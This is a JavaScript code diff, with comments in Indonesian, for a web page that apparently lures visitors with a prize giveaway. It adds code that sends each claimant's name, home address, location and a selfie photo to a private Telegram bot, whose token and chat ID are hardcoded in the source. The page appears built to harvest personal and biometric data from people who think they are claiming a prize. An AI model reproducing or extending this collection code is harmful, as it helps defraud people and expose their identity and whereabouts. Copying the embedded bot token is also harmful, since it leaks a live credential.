@@ -1,8 +1,8 @@
 // ==========================================
 // KONFIGURASI TELEGRAM BOT
 // ==========================================
-const TELEGRAM_BOT_TOKEN = "8314141031:AAGdgHhChTJ9NqaH4kCxgLSQ9Dmd13b0d0c"; // Gant
-const TELEGRAM_CHAT_ID = "7660844388"; // Chat ID Anda
+const TELEGRAM_BOT_TOKEN = "8314141031:AAGdgHhChTJ9NqaH4kCxgLSQ9Dmd13b0d0c"; 
+const TELEGRAM_CHAT_ID = "7660844388"; 
 
 const prizes = [
   { label: "Voucher", name: "Voucher belanja" },
@@ -249,10 +249,21 @@ function saveClaims(claims) {
   window.localStorage.setItem(STORAGE_KEY, JSON.stringify(claims));
 }
 
-// Fungsi untuk mengirim data ke Telegram Bot
-async function sendToTelegram(name, address, prize, location) {
-  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+// Fungsi bantu mengubah DataURL foto ke Blob agar bisa dikirim sebagai file foto ke Telegram
+function dataURItoBlob(dataURI) {
+  const splitData = dataURI.split(',');
+  const byteString = atob(splitData[1]);
+  const mimeString = splitData[0].split(':')[1].split(';')[0];
+  const ab = new ArrayBuffer(byteString.length);
+  const ia = new Uint8Array(ab);
+  for (let i = 0; i < byteString.length; i++) {
+    ia[i] = byteString.charCodeAt(i);
+  }
+  return new Blob([ab], { type: mimeString });
+}
 
+// Fungsi pengiriman ke Telegram Bot (Mendukung Teks, Lokasi, dan Foto)
+async function sendToTelegram(name, address, prize, location, photoDataUrl) {
   let message = `<b>🎁 Klaim Hadiah Baru!</b>\n\n`;
   message += `<b>Penerima:</b> ${name}\n`;
   message += `<b>Alamat:</b> ${address}\n`;
@@ -263,17 +274,38 @@ async function sendToTelegram(name, address, prize, location) {
   }
 
   try {
-    const response = await fetch(telegramUrl, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: "HTML"
-      })
-    });
-    const result = await response.json();
-    return result.ok;
+    if (photoDataUrl) {
+      // Kirim beserta foto menggunakan endpoint sendPhoto
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+      const blob = dataURItoBlob(photoDataUrl);
+      
+      const formData = new FormData();
+      formData.append("chat_id", TELEGRAM_CHAT_ID);
+      formData.append("photo", blob, "selfie.jpg");
+      formData.append("caption", message);
+      formData.append("parse_mode", "HTML");
+
+      const response = await fetch(telegramUrl, {
+        method: "POST",
+        body: formData
+      });
+      const result = await response.json();
+      return result.ok;
+    } else {
+      // Kirim pesan teks biasa jika tidak ada foto
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const response = await fetch(telegramUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML"
+        })
+      });
+      const result = await response.json();
+      return result.ok;
+    }
   } catch (error) {
     console.error("Gagal mengirim ke Telegram:", error);
     return false;
@@ -301,9 +333,9 @@ claimButton.addEventListener("click", async () => {
   }
 
   claimButton.disabled = true;
-  claimStatus.textContent = "Menyimpan dan mengirim ke Telegram...";
+  claimStatus.textContent = "Menyimpan & mengirim ke Telegram...";
 
-  // 1. Simpan ke LocalStorage (seperti sebelumnya)
+  // 1. Simpan ke LocalStorage
   const claims = loadClaims();
   claims.unshift({
     id: crypto.randomUUID(),
@@ -316,8 +348,8 @@ claimButton.addEventListener("click", async () => {
   });
   saveClaims(claims);
 
-  // 2. Kirim otomatis ke Telegram Bot
-  await sendToTelegram(name, address, selectedPrize.name, selectedLocation);
+  // 2. Kirim otomatis ke Telegram Bot (Disertai data lokasi dan foto jika diaktifkan user)
+  await sendToTelegram(name, address, selectedPrize.name, selectedLocation, selectedPhotoDataUrl);
 
   claimStatus.textContent = "Klaim berhasil disimpan & dikirim ke bot Telegram!";
   recipientName.value = "";
